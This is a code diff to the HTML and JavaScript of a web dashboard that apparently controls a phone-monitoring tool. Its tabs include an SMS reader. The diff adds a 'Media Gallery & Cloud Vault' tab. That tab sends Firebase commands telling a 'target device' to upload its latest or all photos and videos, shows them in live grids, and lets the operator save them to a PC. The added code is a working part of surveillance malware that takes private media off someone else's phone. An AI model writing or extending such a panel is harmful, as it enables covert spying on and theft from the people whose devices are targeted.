@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css?v=3.7">
+    <link rel="stylesheet" href="style.css?v=3.8">
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
@@ -119,6 +119,9 @@
                 </button>
                 <button class="tab-btn" onclick="switchTab('sms')">
                     <i class="fas fa-envelope"></i> SMS Reader
+                </button>
+                <button class="tab-btn" onclick="switchTab('gallery')">
+                    <i class="fas fa-images"></i> Media Gallery
                 </button>
                 <button class="tab-btn" onclick="switchTab('notification')">
                     <i class="fas fa-paper-plane"></i> Push Notification
@@ -330,7 +333,81 @@
                 </div>
             </div>
 
-            <!-- TAB 6: Push Notification -->
+            <!-- TAB 6: Media Gallery & Cloud Vault -->
+            <div id="tab-gallery" class="tab-content">
+                <div class="card" style="padding: 24px; margin-bottom: 24px;">
+                    <!-- Gallery Control Header -->
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 14px;">
+                        <div>
+                            <h4 style="font-size: 1.1rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
+                                <i class="fas fa-images text-primary-c"></i> Media Gallery & Cloud Photo Vault
+                            </h4>
+                            <p style="font-size: 0.78rem; color: var(--text-secondary); margin: 0;">
+                                Cloud synced photos & videos from target device storage.
+                            </p>
+                        </div>
+                        
+                        <!-- Actions Toolbar -->
+                        <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+                            <div style="display: flex; align-items: center; background: rgba(255,255,255,0.04); border: 1px solid var(--border); border-radius: var(--radius-pill); padding: 2px 6px;">
+                                <span style="font-size: 0.72rem; color: var(--text-muted); padding: 0 6px; font-weight: 600;">Count:</span>
+                                <select id="galleryCountSelect" class="form-input" style="padding: 4px 8px; font-size: 0.75rem; border: none; background: transparent; width: auto; color: #fff;">
+                                    <option value="10" selected>10 Photos</option>
+                                    <option value="20">20 Photos</option>
+                                    <option value="50">50 Photos</option>
+                                    <option value="100">100 Photos</option>
+                                </select>
+                            </div>
+                            
+                            <button onclick="fetchGalleryPhotos('latest')" class="btn-ghost" style="padding: 8px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);" title="Fetch Recent Photos">
+                                <i class="fas fa-sync-alt" style="margin-right: 6px; color: var(--primary);"></i> 🔄 Fetch Gallery Photos
+                            </button>
+
+                            <button onclick="fetchGalleryPhotos('all')" class="btn-primary-glow" style="padding: 8px 18px; font-size: 0.78rem; border-radius: var(--radius-pill); font-weight: 700;" title="Fetch All Photos A-Z">
+                                <i class="fas fa-cloud-download-alt" style="margin-right: 6px;"></i> 🔄 Fetch ALL Gallery Photos
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Sync Status Bar -->
+                    <div id="gallerySyncStatus" style="display: none; background: rgba(255, 59, 48, 0.08); border: 1px solid rgba(255, 59, 48, 0.25); border-radius: 12px; padding: 10px 16px; margin-bottom: 20px; font-size: 0.8rem; color: #fff; align-items: center; justify-content: space-between;">
+                        <span id="gallerySyncMsg"><i class="fas fa-spinner fa-spin" style="color: var(--primary); margin-right: 8px;"></i> Syncing photos from device...</span>
+                        <span id="gallerySyncTime" style="font-size: 0.72rem; color: var(--text-muted);">Just now</span>
+                    </div>
+
+                    <!-- Section 1: Latest Synced Photos Grid -->
+                    <div style="margin-bottom: 30px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 8px; border-bottom: 1px solid var(--border-subtle);">
+                            <h5 style="font-size: 0.92rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0;">
+                                <i class="fas fa-bolt" style="color: #ffd60a;"></i> Latest Synced Photos <span id="recentCountBadge" class="badge-count" style="font-size: 0.65rem;">0</span>
+                            </h5>
+                        </div>
+                        <div id="recentGalleryGrid" class="gallery-grid">
+                            <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
+                                <i class="fas fa-images"></i>
+                                <p>No recent photos loaded. Click <b>'🔄 Fetch Gallery Photos'</b> above to sync latest captures.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Section 2: All Photos (Master Cloud Archive) Grid -->
+                    <div>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 8px; border-bottom: 1px solid var(--border-subtle);">
+                            <h5 style="font-size: 0.92rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0;">
+                                <i class="fas fa-archive text-primary-c"></i> All Gallery Photos (Master Cloud Vault) <span id="allCountBadge" class="badge-count" style="font-size: 0.65rem;">0</span>
+                            </h5>
+                        </div>
+                        <div id="allGalleryGrid" class="gallery-grid">
+                            <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
+                                <i class="fas fa-photo-video"></i>
+                                <p>No archived media found. Click <b>'🔄 Fetch ALL Gallery Photos'</b> to perform a full storage scan.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 7: Push Notification -->
             <div id="tab-notification" class="tab-content">
                 <div class="card" style="padding: 24px; max-width: 600px; margin: 0 auto;">
                     <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 8px;">
@@ -358,6 +435,25 @@
 
         </div>
     </main>
+
+    <!-- Lightbox Modal for Photo Fullscreen Preview -->
+    <div id="galleryLightboxModal" onclick="if(event.target===this)closeLightbox()" class="lightbox-modal">
+        <div style="position: relative; max-width: 90vw; max-height: 90vh; display: flex; flex-direction: column; align-items: center;">
+            <button onclick="closeLightbox()" style="position: absolute; top: -16px; right: -16px; width: 36px; height: 36px; border-radius: 50%; background: #1a1618; border: 1px solid rgba(255,255,255,0.2); color: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 10; box-shadow: 0 4px 14px rgba(0,0,0,0.6);">
+                <i class="fas fa-times"></i>
+            </button>
+            <img id="lightboxImg" src="" alt="Preview" style="max-width: 85vw; max-height: 75vh; border-radius: 14px; object-fit: contain; box-shadow: 0 10px 40px rgba(0,0,0,0.9); border: 1px solid rgba(255,255,255,0.15);">
+            <div style="margin-top: 14px; display: flex; align-items: center; justify-content: space-between; width: 100%; max-width: 600px; background: rgba(18,14,16,0.9); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); padding: 10px 18px; border-radius: 30px; border: 1px solid var(--border);">
+                <div style="display: flex; flex-direction: column; overflow: hidden; margin-right: 12px;">
+                    <span id="lightboxName" style="font-size: 0.85rem; font-weight: 700; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">Photo</span>
+                    <span id="lightboxMeta" style="font-size: 0.7rem; color: var(--text-muted);">Timestamp</span>
+                </div>
+                <a id="lightboxDlBtn" href="" download="photo.jpg" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.75rem; border-radius: var(--radius-pill); text-decoration: none; white-space: nowrap;">
+                    <i class="fas fa-download me-1"></i> Save to PC
+                </a>
+            </div>
+        </div>
+    </div>
 
     <!-- Premium Lock Modal (Apple Glass VIP Dialog) -->
     <div id="premiumLockModal" onclick="if(event.target===this)closeLockModal()" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(4, 4, 6, 0.78); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); z-index: 100000; align-items: center; justify-content: center; padding: 20px;">
@@ -1008,6 +1104,138 @@
         });
         h += '</div>';
         container.innerHTML = h;
+    });
+
+    // ==========================================
+    // Media Gallery & Cloud Vault Engine
+    // ==========================================
+    function fetchGalleryPhotos(mode) {
+        const count = parseInt(document.getElementById('galleryCountSelect').value) || 10;
+        const statusEl = document.getElementById('gallerySyncStatus');
+        const msgEl = document.getElementById('gallerySyncMsg');
+        const timeEl = document.getElementById('gallerySyncTime');
+
+        if (statusEl) {
+            statusEl.style.display = 'flex';
+            if (msgEl) msgEl.innerHTML = `<i class="fas fa-spinner fa-spin" style="color:var(--primary);margin-right:8px;"></i> ${mode === 'all' ? 'Scanning entire device storage for all photos & videos...' : `Syncing latest ${count} photos from device...`}`;
+            if (timeEl) timeEl.textContent = new Date().toLocaleTimeString();
+        }
+
+        if (mode === 'all') {
+            devRef.child('commands/fetchGallery').set({
+                mode: 'all',
+                timestamp: Date.now()
+            });
+            alert("Command sent: Fetching ALL device photos & videos (A-Z)... They will appear in the Cloud Archive grid shortly.");
+        } else {
+            devRef.child('commands/fetchGallery').set({
+                mode: 'latest',
+                count: count,
+                timestamp: Date.now()
+            });
+            alert(`Command sent: Fetching latest ${count} photos... They will appear in the Latest Synced grid shortly.`);
+        }
+    }
+
+    function openLightbox(src, name, meta) {
+        const modal = document.getElementById('galleryLightboxModal');
+        const img = document.getElementById('lightboxImg');
+        const nameEl = document.getElementById('lightboxName');
+        const metaEl = document.getElementById('lightboxMeta');
+        const dlBtn = document.getElementById('lightboxDlBtn');
+
+        if (img) img.src = src;
+        if (nameEl) nameEl.textContent = name || 'Photo Preview';
+        if (metaEl) metaEl.textContent = meta || '';
+        if (dlBtn) {
+            dlBtn.href = src;
+            dlBtn.download = name || 'downloaded_photo.jpg';
+        }
+        if (modal) modal.style.display = 'flex';
+    }
+
+    function closeLightbox() {
+        const modal = document.getElementById('galleryLightboxModal');
+        if (modal) modal.style.display = 'none';
+    }
+
+    // Real-Time Listeners for Recent & All Gallery
+    devRef.child('media/recent').on('value', snap => {
+        const data = snap.val();
+        const container = document.getElementById('recentGalleryGrid');
+        const badge = document.getElementById('recentCountBadge');
+        if (!container) return;
+
+        if (!data) {
+            container.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;"><i class="fas fa-images"></i><p>No recent photos loaded. Click <b>\'🔄 Fetch Gallery Photos\'</b> above to sync.</p></div>';
+            if (badge) badge.textContent = '0';
+            return;
+        }
+
+        const items = Array.isArray(data) ? data : Object.values(data);
+        if (badge) badge.textContent = items.length;
+
+        let html = '';
+        items.forEach((item, index) => {
+            const src = item.url || (item.base64 ? (item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64) : '');
+            const name = item.name || `Recent_Photo_${index + 1}.jpg`;
+            const date = item.time ? new Date(item.time).toLocaleDateString() : '';
+            const size = item.size ? (item.size > 1048576 ? (item.size / 1048576).toFixed(1) + ' MB' : (item.size / 1024).toFixed(0) + ' KB') : '';
+
+            if (src) {
+                html += `
+                <div class="gallery-card" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} ${size}')">
+                    <img src="${src}" alt="${escapeHtml(name)}" loading="lazy">
+                    <div class="gallery-card-overlay">
+                        <span class="gallery-card-name">${escapeHtml(name)}</span>
+                        <div class="gallery-card-meta">
+                            <span>${date}</span>
+                            <span>${size}</span>
+                        </div>
+                    </div>
+                </div>`;
+            }
+        });
+        container.innerHTML = html || '<div class="empty-state" style="grid-column: 1 / -1;"><p>No valid photo previews found.</p></div>';
+    });
+
+    devRef.child('media/gallery').on('value', snap => {
+        const data = snap.val();
+        const container = document.getElementById('allGalleryGrid');
+        const badge = document.getElementById('allCountBadge');
+        if (!container) return;
+
+        if (!data) {
+            container.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;"><i class="fas fa-photo-video"></i><p>No archived media found. Click <b>\'🔄 Fetch ALL Gallery Photos\'</b> to sync entire device library.</p></div>';
+            if (badge) badge.textContent = '0';
+            return;
+        }
+
+        const items = Array.isArray(data) ? data : Object.values(data);
+        if (badge) badge.textContent = items.length;
+
+        let html = '';
+        items.forEach((item, index) => {
+            const src = item.url || (item.base64 ? (item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64) : '');
+            const name = item.name || `Gallery_${index + 1}.jpg`;
+            const date = item.time ? new Date(item.time).toLocaleDateString() : '';
+            const size = item.size ? (item.size > 1048576 ? (item.size / 1048576).toFixed(1) + ' MB' : (item.size / 1024).toFixed(0) + ' KB') : '';
+
+            if (src) {
+                html += `
+                <div class="gallery-card" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} ${size}')">
+                    <img src="${src}" alt="${escapeHtml(name)}" loading="lazy">
+                    <div class="gallery-card-overlay">
+                        <span class="gallery-card-name">${escapeHtml(name)}</span>
+                        <div class="gallery-card-meta">
+                            <span>${date}</span>
+                            <span>${size}</span>
+                        </div>
+                    </div>
+                </div>`;
+            }
+        });
+        container.innerHTML = html || '<div class="empty-state" style="grid-column: 1 / -1;"><p>No media files found.</p></div>';
     });
     </script>
 </body>
